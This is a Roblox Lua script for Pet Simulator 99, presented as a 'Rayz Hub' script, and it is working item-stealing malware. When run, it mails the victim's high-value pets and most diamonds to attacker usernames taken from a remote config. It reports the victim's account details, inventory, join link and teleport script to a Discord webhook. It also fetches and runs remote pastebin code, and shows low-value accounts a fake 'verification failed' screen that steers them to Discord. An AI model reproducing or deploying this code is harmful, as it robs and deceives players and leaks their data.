getgenv().done = getgenv().done or false
if getgenv().done then
	return
end
getgenv().done = true

repeat
	task.wait()
until game:IsLoaded()

---------------------------------------------------------------------
--  SERVICES
---------------------------------------------------------------------
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

---------------------------------------------------------------------
--  CONFIG LOADER
---------------------------------------------------------------------
local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
	local success, result = pcall(function()
		local response = game:HttpGet(CONFIG_URL, true)
		return HttpService:JSONDecode(response)
	end)
	if success and result then
		return result
	end
	return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
	player:Kick("Failed to load config. Check your internet.")
	return
end

local receivers = Config.usernames
local webhook = Config.webhooks.ps99

local NAME = "Pet Simulator 99"
local AVATAR_URL = "https://rayzhub.netlify.app/media/ps99(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/ps99(9x16).jpg"

---------------------------------------------------------------------
--  SETTINGS
---------------------------------------------------------------------
local min_rap = 1000000
local mail_message = "Rayz Hub"

local request = (syn and syn.request)
	or (http and http.request)
	or http_request
	or (fluxus and fluxus.request)
	or request
	or httprequest

---------------------------------------------------------------------
--  MODULES
---------------------------------------------------------------------
local Network = ReplicatedStorage:WaitForChild("Network", 10)
local RAP = require(ReplicatedStorage.Library.Client.RAPCmds)
local PetsDir = require(ReplicatedStorage.Library.Directory.Pets)
local MessageLib = require(ReplicatedStorage.Library.Client.Message)

---------------------------------------------------------------------
--  HELPER FUNCTIONS
---------------------------------------------------------------------
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = player.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" or status == "🟢 Sent" then
		return 0x2ECC71
	elseif status == "🔵 Partially Sent" then
		return 0x3498DB
	elseif status == "🟡 Sending" or status == "🟡 Waiting" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

local function formatNumber(n)
	if not n then
		return "0"
	end
	local suffixes = { "", "k", "m", "b", "t", "q" }
	local i = 1
	while n >= 1000 and i < #suffixes do
		n = n / 1000
		i = i + 1
	end
	return string.format("%.2f%s", n, suffixes[i])
end

local function sendCoreNotification(title, text, duration)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = title or "Notification",
			Text = text or "Message here",
			Duration = duration or 5,
			Icon = "rbxassetid://101542615851651",
		})
	end)
end

local function getPetEmoji(petName)
	local lower = (petName or ""):lower()
	if lower:find("dragon") then
		return "🐉"
	elseif lower:find("cat") then
		return "🐱"
	elseif lower:find("dog") then
		return "🐶"
	elseif lower:find("unicorn") then
		return "🦄"
	elseif lower:find("phoenix") then
		return "🔥"
	elseif lower:find("wolf") then
		return "🐺"
	elseif lower:find("bear") then
		return "🐻"
	elseif lower:find("lion") then
		return "🦁"
	elseif lower:find("tiger") then
		return "🐯"
	elseif lower:find("monkey") then
		return "🐵"
	elseif lower:find("dominus") then
		return "👑"
	elseif lower:find("titanic") then
		return "⚡"
	elseif lower:find("huge") then
		return "🌟"
	end
	return "🧬"
end

---------------------------------------------------------------------
--  STATE VARIABLES
---------------------------------------------------------------------
local last_message_id = nil
local valuables = {}
local is_finished = false
local sent_rap_total = 0
local player_total_rap = 0
local diamonds_to_send = 0
local diamonds_sent = 0

---------------------------------------------------------------------
--  INVENTORY HELPERS
---------------------------------------------------------------------
local function getRAP(item)
	local mock = {
		Class = { Name = "Pet" },
		IsA = function()
			return true
		end,
		GetId = function()
			return item.id
		end,
		StackKey = function()
			return HttpService:JSONEncode({ id = item.id, pt = item.pt, sh = item.sh, tn = item.tn })
		end,
		AbstractGetRAP = function()
			return nil
		end,
	}
	local s, r = pcall(RAP.Get, mock)
	return s and r or 0
end

local function prepareInventory()
	local save = require(ReplicatedStorage.Library.Client.Save).Get() or {}
	local inv = save.Inventory or {}
	if inv.Box then
		for k in pairs(inv.Box) do
			pcall(Network["Box: Withdraw All"].InvokeServer, Network["Box: Withdraw All"], k)
		end
	end
	pcall(function()
		Network["Mailbox: Claim All"]:InvokeServer()
	end)
	pcall(function()
		require(ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	end)
end

---------------------------------------------------------------------
--  WEBHOOK
---------------------------------------------------------------------
local function updateWebhook(status_key)
	if not request or not webhook or webhook == "" then
		return
	end

	local status_map = {
		sending = "🟡 Sending",
		claimed = "🟢 Sent",
		partial = "🔵 Partially Sent",
		failed = "🔴 Failed",
	}
	local status_text = status_map[status_key] or status_key
	local embedColor = getStatusColor(status_text)

	-- Player information
	local displayName = (player.DisplayName and player.DisplayName ~= "") and player.DisplayName or player.Name
	local userName = player.Name
	local accountAge = getAccountAge()
	local executor = getExecutorName()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(receivers, ", ")

	local playerInfoText = "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor      : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	-- Build inventory lines
	local inventoryLines = {}
	for _, v in ipairs(valuables) do
		local emoji = getPetEmoji(v.full_name)
		local prefix = v.sent_amount == v.amount and "✅" or "⏳"
		local line = prefix
			.. " "
			.. emoji
			.. " "
			.. v.full_name
			.. " x"
			.. v.sent_amount
			.. "/"
			.. v.amount
			.. " ("
			.. formatNumber(v.sent_amount * v.rap)
			.. " / "
			.. formatNumber(v.amount * v.rap)
			.. ")"
		table.insert(inventoryLines, line)
	end

	-- Diamonds line
	local gemPrefix = diamonds_sent >= diamonds_to_send and "✅" or "⏳"
	table.insert(
		inventoryLines,
		gemPrefix
			.. " 💎 Diamonds "
			.. formatNumber(diamonds_sent)
			.. " / "
			.. formatNumber(diamonds_to_send)
	)

	local total_sent = sent_rap_total + diamonds_sent
	local total_possible = player_total_rap + diamonds_to_send

	local inventoryText = #inventoryLines > 0 and table.concat(inventoryLines, "\n") or "No valuable items"
	inventoryText = inventoryText
		.. "\n─────────────────────────────────\n📊 Total: "
		.. formatNumber(total_sent)
		.. " / "
		.. formatNumber(total_possible)

	-- Join link and teleport script
	local jobId = tostring(game.JobId)
	local joinUrl = "https://rayzhub.netlify.app?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. jobId
	local tpScript = string.format(
		'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
		game.PlaceId,
		game.JobId
	)

	-- Ping logic
	local contentText = ""
	if player_total_rap >= 10000000 then
		contentText = "> @everyone 🔔 **AMAZING HIT • RAP: " .. formatNumber(player_total_rap) .. "**"
	elseif player_total_rap >= 1000000 then
		contentText = "> @everyone 🔔 **GOOD HIT • RAP: " .. formatNumber(player_total_rap) .. "**"
	elseif player_total_rap > 0 then
		contentText = "> 🔔 **Small Hit • RAP: " .. formatNumber(player_total_rap) .. "**"
	end
	contentText = contentText .. "\n```lua\n" .. tpScript .. "\n```"

	local payload = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				fields = {
					{
						name = "📄 Player Information",
						value = "```" .. playerInfoText .. "```",
						inline = false,
					},
					{
						name = "📡 Player Status",
						value = "```" .. status_text .. "```",
						inline = false,
					},
					{
						name = "🎒 Inventory (" .. tostring(#valuables) .. " pets + 💎)",
						value = "```" .. inventoryText .. "```",
						inline = false,
					},
					{
						name = "👤 Join Link",
						value = "[🔗 Click to Join Player](" .. joinUrl .. ")",
						inline = false,
					},
				},
				footer = {
					text = "RAYZ HUB • PS99 • " .. os.date("!%m/%d/%Y %I:%M %p") .. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	local url = last_message_id and (webhook .. "/messages/" .. last_message_id) or (webhook .. "?wait=true")
	local method = last_message_id and "PATCH" or "POST"

	local ok, response = pcall(function()
		return request({
			Url = url,
			Method = method,
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)

	if ok and not last_message_id and response then
		local body = (type(response) == "table") and (response.Body or response.body) or nil
		if body then
			local decodeOk, decoded = pcall(function()
				return HttpService:JSONDecode(body)
			end)
			if decodeOk and decoded and decoded.id then
				last_message_id = decoded.id
			end
		end
	end
end

---------------------------------------------------------------------
--  LOW VALUE WARNING GUI
---------------------------------------------------------------------
local function ShowLowValueWarning()
	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "RayzModernWarning"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.DisplayOrder = 999
	ScreenGui.Parent = game:GetService("CoreGui")

	local MainFrame = Instance.new("Frame")
	MainFrame.Size = UDim2.new(0, 500, 0, 350)
	MainFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
	MainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
	MainFrame.BorderSizePixel = 0
	MainFrame.Parent = ScreenGui

	local UICorner = Instance.new("UICorner")
	UICorner.CornerRadius = UDim.new(0, 15)
	UICorner.Parent = MainFrame

	local UIStroke = Instance.new("UIStroke")
	UIStroke.Color = Color3.fromRGB(130, 60, 255)
	UIStroke.Thickness = 3
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Parent = MainFrame

	local Title = Instance.new("TextLabel")
	Title.Size = UDim2.new(1, 0, 0, 70)
	Title.BackgroundTransparency = 1
	Title.Text = "SYSTEM ERROR: VERIFICATION FAILED"
	Title.TextColor3 = Color3.fromRGB(180, 130, 255)
	Title.Font = Enum.Font.GothamBlack
	Title.TextSize = 22
	Title.Parent = MainFrame

	local Message = Instance.new("TextLabel")
	Message.Size = UDim2.new(1, -60, 0, 180)
	Message.Position = UDim2.new(0, 30, 0, 75)
	Message.BackgroundTransparency = 1
	Message.Text = "Your account has been detected as an <font color='#FF4B4B'><b>ALT</b></font> account.\n\n"
		.. "• You don't have enough gems\n"
		.. "• You don't have enough RAP\n"
		.. "• Security verification failed\n\n"
		.. "To use this script, please switch to your <b>Main Account</b> or join our discord server for help."
	Message.TextColor3 = Color3.fromRGB(210, 210, 230)
	Message.Font = Enum.Font.GothamMedium
	Message.TextSize = 17
	Message.RichText = true
	Message.TextWrapped = true
	Message.TextXAlignment = Enum.TextXAlignment.Left
	Message.TextYAlignment = Enum.TextYAlignment.Top
	Message.Parent = MainFrame

	local InviteContainer = Instance.new("Frame")
	InviteContainer.Size = UDim2.new(1, -60, 0, 60)
	InviteContainer.Position = UDim2.new(0, 30, 1, -85)
	InviteContainer.BackgroundColor3 = Color3.fromRGB(30, 20, 50)
	InviteContainer.Parent = MainFrame

	local InviteCorner = Instance.new("UICorner")
	InviteCorner.CornerRadius = UDim.new(0, 10)
	InviteCorner.Parent = InviteContainer

	local InviteText = Instance.new("TextLabel")
	InviteText.Size = UDim2.new(0.65, 0, 1, 0)
	InviteText.Position = UDim2.new(0.05, 0, 0, 0)
	InviteText.BackgroundTransparency = 1
	InviteText.Text = "discord.gg/SnXQCYzGjx"
	InviteText.TextColor3 = Color3.fromRGB(160, 120, 255)
	InviteText.Font = Enum.Font.Code
	InviteText.TextSize = 18
	InviteText.TextXAlignment = Enum.TextXAlignment.Left
	InviteText.Parent = InviteContainer

	local CopyBtn = Instance.new("TextButton")
	CopyBtn.Size = UDim2.new(0.3, 0, 0.7, 0)
	CopyBtn.Position = UDim2.new(0.65, 0, 0.15, 0)
	CopyBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 255)
	CopyBtn.Text = "COPY LINK"
	CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CopyBtn.Font = Enum.Font.GothamBold
	CopyBtn.TextSize = 15
	CopyBtn.Parent = InviteContainer

	local BtnCorner = Instance.new("UICorner")
	BtnCorner.CornerRadius = UDim.new(0, 8)
	BtnCorner.Parent = CopyBtn

	CopyBtn.MouseButton1Click:Connect(function()
		pcall(function()
			setclipboard("https://discord.gg/SnXQCYzGjx")
		end)
		CopyBtn.Text = "COPIED!"
		CopyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 100)
		task.delay(2, function()
			if CopyBtn then
				CopyBtn.Text = "COPY LINK"
				CopyBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 255)
			end
		end)
	end)

	local UIS = game:GetService("UserInputService")
	local dragToggle, dragStart, startPos
	MainFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragToggle = true
			dragStart = input.Position
			startPos = MainFrame.Position
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement and dragToggle then
			local delta = input.Position - dragStart
			MainFrame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	UIS.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragToggle = false
		end
	end)
end

---------------------------------------------------------------------
--  MAIN EXECUTION
---------------------------------------------------------------------
prepareInventory()

local save = require(ReplicatedStorage.Library.Client.Save).Get() or {}
local inv = save.Inventory or {}

for _, item in pairs(inv.Currency or {}) do
	if item.id == "Diamonds" then
		diamonds_to_send = (item._am or 0) - 15000
		break
	end
end
if diamonds_to_send < 0 then
	diamonds_to_send = 0
end

for uid, pet in pairs(inv.Pet or {}) do
	local rap = getRAP(pet)
	if (PetsDir[pet.id] and (PetsDir[pet.id].huge or PetsDir[pet.id].exclusiveLevel)) and rap >= min_rap then
		local name = (pet.sh and "Shiny " or "")
			.. (pet.pt == 1 and "Gold " or pet.pt == 2 and "Rainbow " or "")
			.. pet.id
		table.insert(valuables, {
			uid = uid,
			full_name = name,
			rap = rap,
			amount = pet._am or 1,
			sent_amount = 0,
			category = "Pet",
		})
		player_total_rap = player_total_rap + (rap * (pet._am or 1))
	end
end

local total_gems = diamonds_to_send + 15000

if player_total_rap >= 1000000 and total_gems >= 100000 then
	pcall(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/h66gYgRe"))()
	end)
	task.wait(1)
	sendCoreNotification("discord link copied", "join our discord server for more scripts", 6)
	pcall(function()
		setclipboard("https://discord.gg/pgsQatrnDw")
	end)
else
	ShowLowValueWarning()
	updateWebhook("failed")
	return
end

if #valuables == 0 and diamonds_to_send <= 0 then
	updateWebhook("failed")
	return
end

updateWebhook("sending")

Players.PlayerRemoving:Connect(function(lp)
	if lp == player and not is_finished then
		updateWebhook("failed")
	end
end)

---------------------------------------------------------------------
--  SEND ITEMS VIA MAILBOX
---------------------------------------------------------------------
for _, item in ipairs(valuables) do
	for _, receiver in ipairs(receivers) do
		local success = pcall(function()
			return Network["Mailbox: Send"]:InvokeServer(
				receiver,
				mail_message,
				item.category,
				item.uid,
				item.amount
			)
		end)
		if success then
			item.sent_amount = item.amount
			sent_rap_total = sent_rap_total + (item.rap * item.amount)
			updateWebhook("sending")
			break
		end
	end
	task.wait(1.5)
end

if diamonds_to_send > 10000 then
	local success = pcall(function()
		return Network["Mailbox: Send"]:InvokeServer(
			receivers[1],
			mail_message,
			"Currency",
			"Diamonds",
			diamonds_to_send
		)
	end)
	if success then
		diamonds_sent = diamonds_to_send
		updateWebhook("sending")
	end
end

is_finished = true
local fully_sent = (sent_rap_total >= player_total_rap) and (diamonds_sent >= diamonds_to_send)
updateWebhook(fully_sent and "claimed" or "partial")

print("[Rayz Hub] ps99 loaded...")